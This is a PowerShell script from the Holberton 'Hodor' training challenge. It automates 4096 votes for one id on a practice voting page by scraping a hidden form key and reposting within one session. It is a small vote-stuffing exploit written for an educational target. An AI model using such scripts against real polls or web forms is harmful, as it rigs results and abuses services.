#=======================================
#= 1. Level 1 - Holberton Hodor Project
#========================================

# ---------------------------------------
# script that votes 4096 times for your id
# here: http://158.69.76.135/level1.php.
# Using WebRequest session (GET - POST)
#-----------------------------------------

$url = "http://158.69.76.135/level1.php";
$headers = @{'Content-Type'= 'application/x-www-form-urlencoded';'ContentLength' = 512}

for($i=1; $i -le 4096; $i++){

    $page = Invoke-WebRequest $url -Method Get -SessionVariable hodor;
    $elements_a = $page.ParsedHtml.getElementsByTagName('input') | ?{$_.getAttribute('type') -eq "hidden"} |
    select -ExpandProperty outerHTML;
    $parse = $elements_a -split " "
    $match_key = $parse -match 'value'
    $match_key = $match_key -split "="

    $body = @{'id'='3922';'holdthedoor'="holdthedoor";'key'=$match_key[1]}

    $IRM = Invoke-RestMethod -Method 'Post' -Uri $url -Body $body -WebSession $hodor
}

Write-Output "sucessfull voting"
